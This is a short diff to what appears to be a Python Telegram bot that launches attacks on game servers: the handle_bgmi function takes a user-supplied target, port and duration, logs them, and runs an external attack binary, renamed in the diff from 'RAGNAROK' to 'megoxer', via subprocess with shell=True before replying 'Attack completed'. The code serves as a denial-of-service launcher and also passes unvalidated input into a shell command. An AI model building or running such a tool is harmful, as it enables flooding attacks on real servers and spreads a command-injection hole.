@@ -237,10 +237,10 @@ def handle_bgmi(message):
             if time > 180:
                 response = "❗️𝗘𝗿𝗿𝗼𝗿: 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀𝘁𝗵𝗲𝗻 180 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
             else:
-                record_command_logs(user_id, '/RAGNAROK', target, port, time)
+                record_command_logs(user_id, '/megoxer', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./RAGNAROK {target} {port} {time} CRACKS"
+                full_command = f"./megoxer {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
                 response = f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 ✅"
         else:
